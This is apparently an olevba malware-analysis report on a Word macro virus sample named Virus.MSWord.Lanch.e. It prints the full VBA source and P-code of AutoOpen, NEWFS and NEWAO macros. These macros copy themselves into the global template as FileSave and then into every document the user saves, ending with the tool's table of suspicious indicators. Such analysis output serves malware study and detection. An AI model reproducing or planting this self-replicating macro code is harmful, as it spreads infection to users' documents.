olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lanch.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lanch.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Lanch.e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bTooMuchTrouble
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "FileSave" Then
            bTooMuchTrouble = -1
        End If
    Next i
    If Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSave"
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:NEWFS"
        sMacro$ = sMe$ + ":NEWAO"
        WordBasic.MacroCopy sMacro$, "Global:NEWAO"
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NEWFS.bas 
in file: Virus.MSWord.Lanch.e - OLE stream: 'Macros/VBA/NEWFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
If InStr(WordBasic.[FileName$](), "\") = 0 Then
    WordBasic.Dialog.FileSaveAs dlg
    sMe$ = WordBasic.[FileNameInfo$](dlg.Name, 1)
    WordBasic.FileSaveAs dlg
Else
    sMe$ = WordBasic.[FileName$]()
End If
If dlg.Format = 0 Then dlg.Format = 1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:NEWAO", sTMacro$
sTMacro$ = sMe$ + ":NEWAO"
WordBasic.MacroCopy "Global:NEWAO", sTMacro$
sTMacro$ = sMe$ + ":NEWFS"
WordBasic.MacroCopy "Global:NEWFS", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NEWAO.bas 
in file: Virus.MSWord.Lanch.e - OLE stream: 'Macros/VBA/NEWAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bTooMuchTrouble
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "FileSave" Then
            bTooMuchTrouble = -1
        End If
    Next i
    If Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSave"
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:NEWFS"
        sMacro$ = sMe$ + ":NEWAO"
        WordBasic.MacroCopy sMacro$, "Global:NEWAO"
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lanch.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2642 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn bTooMuchTrouble
' Line #5:
' 	Dim 
' 	VarDefn sMe
' Line #6:
' 	Dim 
' 	VarDefn sMacro
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #8:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #10:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0008 "FileSave"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bTooMuchTrouble 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	Ld bTooMuchTrouble 
' 	Not 
' 	IfBlock 
' Line #15:
' 	QuoteRem 0x0008 0x0035 "add FileSaveAs and copies of AutoOpen and FileSaveAs."
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #18:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #20:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWFS"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWAO"
' 	Add 
' 	St sMacro$ 
' Line #22:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Label Abort 
' Line #25:
' 	EndSub 
' Macros/VBA/NEWFS - 2227 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	QuoteRem 0x0000 0x0033 "this becomes the FileSaveAs for the global template"
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 "\"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #9:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #10:
' 	Ld dlg 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St sMe$ 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #17:
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWAO"
' 	Add 
' 	St sTMacro$ 
' Line #19:
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sTMacro$ 
' Line #21:
' 	LitStr 0x000C "Global:NEWFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' 	GoTo Done 
' Line #24:
' Line #25:
' 	Label Bail 
' Line #26:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Label Done 
' Line #30:
' 	EndSub 
' Macros/VBA/NEWAO - 2031 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn bTooMuchTrouble
' Line #5:
' 	Dim 
' 	VarDefn sMe
' Line #6:
' 	Dim 
' 	VarDefn sMacro
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #8:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #10:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0008 "FileSave"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bTooMuchTrouble 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	Ld bTooMuchTrouble 
' 	Not 
' 	IfBlock 
' Line #15:
' 	QuoteRem 0x0008 0x0035 "add FileSaveAs and copies of AutoOpen and FileSaveAs."
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #18:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #20:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWFS"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWAO"
' 	Add 
' 	St sMacro$ 
' Line #22:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Label Abort 
' Line #25:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

